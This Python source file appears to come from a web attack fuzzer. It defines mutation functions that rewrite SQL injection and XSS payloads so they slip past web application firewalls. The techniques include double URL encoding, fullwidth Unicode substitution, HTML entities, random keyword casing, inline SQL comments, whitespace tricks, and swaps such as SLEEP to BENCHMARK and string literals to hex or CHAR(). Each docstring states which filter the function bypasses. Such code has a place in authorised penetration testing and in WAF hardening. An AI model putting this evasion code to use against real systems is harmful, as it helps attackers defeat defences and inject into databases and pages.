class MutationStrategy:
    """A named transformation function that takes a payload string and returns a mutated variant."""

    def __init__(self, name: str, fn: Callable[[str], str], vuln_types: Optional[List[str]] = None):
        self.name = name
        self.fn = fn
        self.vuln_types = vuln_types  # None means applies to all

    def apply(self, payload: str) -> str:
        return self.fn(payload)


# ── Universal encoding mutations ────────────────────────────────────────────

def _double_url_encode(payload: str) -> str:
    """Encode each byte twice: ' → %27 → %2527. Bypasses single-decode WAFs."""
    first = urllib.parse.quote(payload, safe="")
    return urllib.parse.quote(first, safe="")


def _unicode_normalization(payload: str) -> str:
    """Replace ASCII chars with Unicode fullwidth equivalents (U+FF01..U+FF5E).
    WAF regex operates on ASCII; backend normalizes fullwidth → ASCII."""
    result = []
    for ch in payload:
        code = ord(ch)
        if 0x21 <= code <= 0x7E:
            result.append(chr(code - 0x21 + 0xFF01))
        else:
            result.append(ch)
    return "".join(result)


def _hex_encode_chars(payload: str) -> str:
    """Replace key SQL/XSS trigger chars with hex URL encoding."""
    replacements = {
        "'": "%27", '"': "%22", "<": "%3C", ">": "%3E",
        "(": "%28", ")": "%29", " ": "%20", ";": "%3B",
        "|": "%7C", "&": "%26", "=": "%3D",
    }
    result = payload
    for char, enc in replacements.items():
        result = result.replace(char, enc)
    return result


def _html_entity_encode(payload: str) -> str:
    """Replace characters with HTML decimal/hex entities. Useful for XSS in HTML context."""
    result = []
    for ch in payload:
        if ch in "<>\"'&;()=/":
            if random.random() > 0.5:
                result.append(f"&#{ord(ch)};")
            else:
                result.append(f"&#x{ord(ch):x};")
        else:
            result.append(ch)
    return "".join(result)


def _mixed_case_keywords(payload: str) -> str:
    """Randomly alternate case in SQL keywords: SELECT → SeLeCt.
    ModSecurity CRS rule 942190 checks case-insensitive, but some
    simpler WAFs only check exact case."""
    sql_keywords = [
        "SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP",
        "FROM", "WHERE", "AND", "OR", "NOT", "NULL", "LIKE",
        "ORDER", "BY", "GROUP", "HAVING", "LIMIT", "SLEEP",
        "BENCHMARK", "WAITFOR", "DELAY", "INTO", "OUTFILE",
        "LOAD_FILE", "CONCAT", "CHAR", "TABLE", "DATABASE",
        "INFORMATION_SCHEMA", "pg_sleep",
    ]
    result = payload
    for kw in sql_keywords:
        import re as _re
        def _randomize_case(match):
            return "".join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in match.group(0)
            )
        result = _re.sub(r'\b' + _re.escape(kw) + r'\b', _randomize_case, result, flags=_re.IGNORECASE)
    return result


# ── SQL injection specific mutations ────────────────────────────────────────

def _sql_comment_insertion(payload: str) -> str:
    """Insert inline comments between characters of SQL keywords:
    SELECT → S/**/E/**/L/**/E/**/C/**/T
    Bypasses regex that looks for contiguous keyword strings."""
    sql_keywords = [
        "SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT",
        "UPDATE", "DELETE", "DROP", "SLEEP", "BENCHMARK", "WAITFOR",
        "DELAY", "CONCAT", "ORDER", "GROUP", "HAVING",
    ]
    result = payload
    for kw in sql_keywords:
        pattern = re.compile(re.escape(kw), re.IGNORECASE)
        def _insert_comments(match):
            word = match.group(0)
            return "/**/".join(word)
        result = pattern.sub(_insert_comments, result)
    return result


def _sql_whitespace_substitution(payload: str) -> str:
    """Replace spaces with SQL-valid whitespace alternatives.
    Tabs, newlines, and /**/ comments are valid SQL whitespace."""
    alternatives = ["\t", "\n", "/**/", "%09", "%0a", "%0d"]
    result = ""
    for ch in payload:
        if ch == " ":
            result += random.choice(alternatives)
        else:
            result += ch
    return result


def _sql_alternative_syntax(payload: str) -> str:
    """Replace common SQL functions with equivalent alternatives.
    E.g., CONCAT('a','b') → 'a'||'b' (PostgreSQL/Oracle)
          SLEEP(5) → BENCHMARK(5000000,SHA1('x')) (MySQL alternative)"""
    replacements = [
        (r"SLEEP\((\d+)\)", r"BENCHMARK(\g<1>000000,SHA1('x'))"),
        (r"UNION\s+SELECT", "UNION ALL SELECT"),
        (r"OR\s+1=1", "OR 2>1"),
        (r"AND\s+1=1", "AND 2-1=1"),
        (r"AND\s+1=2", "AND 1>2"),
    ]
    result = payload
    for pat, repl in replacements:
        result = re.sub(pat, repl, result, flags=re.IGNORECASE)
    return result


def _sql_hex_string(payload: str) -> str:
    """Convert string literals to MySQL hex notation: 'admin' → 0x61646D696E."""
    def _to_hex(match):
        s = match.group(1)
        hex_val = s.encode().hex()
        return f"0x{hex_val}"
    return re.sub(r"'([a-zA-Z0-9_]+)'", _to_hex, payload)


def _sql_char_function(payload: str) -> str:
    """Convert string literals to CHAR() calls: 'a' → CHAR(97).
    Bypasses string-literal pattern matching."""
    def _to_char(match):
        s = match.group(1)
        chars = ",".join(str(ord(c)) for c in s)
        return f"CONCAT(CHAR({chars}))"
    return re.sub(r"'([a-zA-Z0-9_]+)'", _to_char, payload)


